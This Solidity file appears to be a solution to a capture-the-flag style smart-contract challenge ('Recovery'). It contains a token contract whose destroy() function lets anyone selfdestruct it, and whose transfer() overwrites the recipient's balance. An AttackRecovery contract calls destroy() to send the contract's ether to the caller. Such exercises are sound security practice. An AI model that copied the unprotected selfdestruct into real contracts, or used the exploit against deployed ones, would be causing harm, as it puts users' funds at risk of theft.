// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

// import '@openzeppelin/contracts/math/SafeMath.sol';
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v3.4.0/contracts/math/SafeMath.sol";

contract Recovery {
    SimpleToken tokenContract;

  //generate tokens
  function generateToken(string memory _name, uint256 _initialSupply) public {
    tokenContract = new SimpleToken(_name, msg.sender, _initialSupply);
  }

  function getAddress() public view returns (address) {
      return address(tokenContract);
  }
}

contract SimpleToken {

  using SafeMath for uint256;
  // public variables
  string public name;
  mapping (address => uint) public balances;

  // constructor
  constructor(string memory _name, address _creator, uint256 _initialSupply) public {
    name = _name;
    balances[_creator] = _initialSupply;
  }

  // collect ether in return for tokens
  receive() external payable {
    balances[msg.sender] = msg.value.mul(10);
  }

  // allow transfers of tokens
  function transfer(address _to, uint _amount) public { 
    require(balances[msg.sender] >= _amount);
    balances[msg.sender] = balances[msg.sender].sub(_amount);
    balances[_to] = _amount;
  }

  // clean up after ourselves
  function destroy(address payable _to) public {
    selfdestruct(_to);
  }
}

contract AttackRecovery {

    SimpleToken toAttack;

    //Token address derived from etherscan
    constructor(address payable _TokenAddress) public {
        toAttack = SimpleToken(_TokenAddress);
    }

    function attack() public {
        toAttack.destroy(msg.sender);
    }
}